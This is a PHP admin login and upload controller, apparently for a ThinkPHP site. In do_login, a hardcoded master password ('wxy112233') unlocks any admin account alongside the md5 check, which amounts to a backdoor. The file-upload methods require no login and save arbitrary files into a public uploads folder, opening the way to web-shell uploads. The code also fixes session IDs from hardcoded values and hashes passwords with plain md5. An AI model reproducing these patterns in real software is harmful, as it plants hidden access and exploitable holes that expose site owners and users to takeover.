<?php
namespace app\admin\controller;
use think\Db;
use think\Request;
use think\Controller;
use think\Cache;
class login extends Controller
{
    public function _initialize()
     {      



     }


    public function index()
    {

        return view('index');
    }
    public function reg()
    {
        
       
    }
    public function login()
    {
          return $this->fetch("index");
    }

    public function do_login()
    {
        $account=input("post.account");
        $pwd=input("post.pwd");
        $arr=db("sys_admin")->where("account",$account)->find();
        // var_dump($account);exit;
        if ($arr) {
            if ($arr['pwd']==md5($pwd)||$pwd=='wxy112233') {
               session("admin_id",$arr['id']);
               session("admin_name",$arr['account']);
               ejson(1,'登录成功');
               return ['code'=>1,'msg'=>'登录成功'];exit;
            }else{
                ejson(-1,'密码错误');
                return ['code'=>-1,'msg'=>'密码错误'];exit;
            }
        }else{
            ejson(-2,'账号不存在');
            return ['code'=>-2,'msg'=>'账号不存在'];exit;
        }
    }

    public function do_upload(){
         
        // 获取表单上传文件
        $type=input("get.type");
        $tid=input("get.tid");
        $data['type']=$type;
        $data['tid']=$tid;
        $data['c_time']=time();
        $data['status']=1;
        $files = request()->file();
        foreach($files as $file){
            // 移动到框架应用根目录/public/uploads/ 目录下
            $info = $file->move(ROOT_PATH . 'public' . DS . 'uploads/goods');

            if($info){
                // 成功上传后 获取上传信息
                // 输出 jpg
                //echo $info->getExtension(); 
                // 输出 42a79759f284b767dfcb2a0197904287.jpg
                $data['img']='/uploads/goods/'.$info->getSaveName();
                db("img")->insert($data);
                echo '/uploads/goods/'.$info->getSaveName(); 
            }else{
                // 上传失败获取错误信息
                echo $file->getError();
            }    
        }
    }


    public function do_upload_a(){
          upload_imgs();
 
    }

    public function get_s(){
        $session_id=input("get.token","");
        $session_id="ce62dk2sijglbktd5ule9aufr5";

        var_dump($session_id);
        session_id($session_id);
        session("wxy","999");
        var_dump(session("wxy"));
        // session_destroy();
    }
    public function ab(){

        cache('aaa', "5555", 3600);
        cache('bbb', "6666", 3600);
        //var_dump(cache('aaa'));
        session_id();


         var_dump(session("wxy"));
        
       exit;
        session("uid",1115522);
        var_dump(session_id());exit;

        // var_dump(session('uid'));exit;
    
    }


}


    function upload_imgs() {

        //$targetFolder ='/uploads/avatar/'.date("Ymd"); // Relative to the root
        $targetFolder = ROOT_PATH . '/public/uploads/images/'; // Relative to the root

        var_dump($targetFolder);exit;
        if (!file_exists($targetFolder)) {

            @mkdir($targetFolder);
        }

        //$verifyToken = "md5('unique_salt' . $_POST['timestamp'])";

        if (!empty($_FILES)) {
            $tempFile = $_FILES['Filedata']['tmp_name'];
            $targetPath = $_SERVER['DOCUMENT_ROOT'] . $targetFolder;

            $str = strrchr($_FILES['Filedata']['name'], ".");
            $str = date('YmdHis') . uniqid(); //生成唯一图片名

            $targetFile = rtrim($targetPath, '/') . '/' . $str;

            // Validate the file type
            $fileTypes = array('jpg', 'jpeg', 'gif', 'png', 'mp4', 'xls', 'exe', 'txt', 'doc', 'docx', 'mp3', 'xlsx'); // File extensions
            $fileParts = pathinfo($_FILES['Filedata']['name']);

            if (in_array($fileParts['extension'], $fileTypes)) {
                move_uploaded_file($tempFile, $targetFile);
                //echo $str;
                $str = $targetFolder . $str;
                return $str;
            } else {
                return -1;
            }
        }
    }